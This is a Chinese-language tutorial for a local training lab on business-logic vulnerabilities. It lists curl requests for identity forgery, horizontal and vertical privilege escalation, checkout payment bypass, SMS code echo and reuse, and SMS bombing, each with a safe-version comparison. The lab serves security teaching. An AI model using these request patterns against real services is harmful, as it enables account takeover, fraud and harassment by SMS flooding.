# logic_vul 操作教程

- 类型：单体靶场
- 目录：`logic_vul`
- 端口：`9967`
- 推荐入口：`/logic-vul`

## 这是什么

业务逻辑漏洞靶场

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9967` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `logic_vul、logic、business` 过滤到当前项目。
3. 推荐先跑 `logic_vul_identity_attack`，再依次跑水平越权、垂直越权、流程绕过和短信验证码模板。
4. 最后再用 `logic_vul_safe_login_normal`、`logic_vul_sms_safe_normal` 和 `logic_vul_info_normal` 做对照。

推荐直接使用的首页条目：
- `logic_vul_identity_attack`：POST http://宿主机IP:9967/auth/login-vul
- `logic_vul_horizontal_attack`：GET http://宿主机IP:9967/api/personal/2/vul?actingUserId=27
- `logic_vul_vertical_attack`：GET http://宿主机IP:9967/api/admin/report/vul?actingUserId=27
- `logic_vul_workflow_attack`：POST http://宿主机IP:9967/api/orders/5002/checkout/vul?actingUserId=27
- `logic_vul_sms_send_attack`：POST http://宿主机IP:9967/sms/send-vul
- `logic_vul_sms_verify_attack`：POST http://宿主机IP:9967/sms/verify-vul
- `logic_vul_sms_bomb_attack`：POST http://宿主机IP:9967/sms/bomb-vul?phoneNumber=15134299958&batch=5
- `logic_vul_safe_login_normal`：POST http://宿主机IP:9967/auth/login-safe

## 方式二：直接访问接口测试

1. 先访问推荐入口：`http://宿主机IP:9967/logic-vul`。
2. 查看靶场信息：`curl "http://宿主机IP:9967/logic-vul/info"`。
3. 伪造身份：`curl -X POST "http://宿主机IP:9967/auth/login-vul" -H "Content-Type: application/json" -d "{\"username\":\"frances.goldner\",\"debugUserId\":29}"`。
4. 水平越权：`curl "http://宿主机IP:9967/api/personal/2/vul?actingUserId=27"`。
5. 垂直越权：`curl "http://宿主机IP:9967/api/admin/report/vul?actingUserId=27" -H "X-Client-Role: ADMIN"`。
6. 流程绕过：`curl -X POST "http://宿主机IP:9967/api/orders/5002/checkout/vul?actingUserId=27" -H "Content-Type: application/json" -d "{\"clientTotal\":0.01,\"markAsPaid\":true,\"skipInventoryCheck\":true}"`。
7. 短信码漏洞演示第一步：`curl -X POST "http://宿主机IP:9967/sms/send-vul" -H "Content-Type: application/json" -d "{\"phoneNumber\":\"15134299958\"}"`，返回里会直接回显验证码。
8. 短信码漏洞演示第二步：把上一步拿到的验证码，换到别的手机号上测试：`curl -X POST "http://宿主机IP:9967/sms/verify-vul" -H "Content-Type: application/json" -d "{\"phoneNumber\":\"15933988032\",\"smsCode\":\"把上一步回显的验证码填这里\"}"`。
9. 安全版短信发送对照：`curl -X POST "http://宿主机IP:9967/sms/send-safe" -H "Content-Type: application/json" -d "{\"phoneNumber\":\"15134299958\"}"`。
10. 短信轰炸漏洞演示：`curl -X POST "http://宿主机IP:9967/sms/bomb-vul?phoneNumber=15134299958&batch=5"`。
11. 短信频控安全版对照：`curl -X POST "http://宿主机IP:9967/sms/bomb-safe?phoneNumber=15134299958&batch=5"`。
12. 正常登录对照：`curl -X POST "http://宿主机IP:9967/auth/login-safe" -H "Content-Type: application/json" -d "{\"username\":\"frances.goldner\",\"password\":\"3jwl2i3t6\"}"`。

## 测试时重点看什么

1. 伪造身份时，是否能直接拿到管理员 token 或管理员身份信息。
2. 水平越权时，普通用户是否能读取别人的资料。
3. 垂直越权时，只改一个客户端角色头是否就能拿到管理员报表。
4. 流程绕过时，是否能以异常价格或跳过库存/支付直接把订单置为已支付。
5. 短信验证码场景里，自己的验证码是否能用于别人的手机号，验证码是否会直接回显，验证成功后是否还能复用。
6. 短信发送场景里，是否能在短时间内无限制重复发送，安全版是否会在阈值后拦截。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
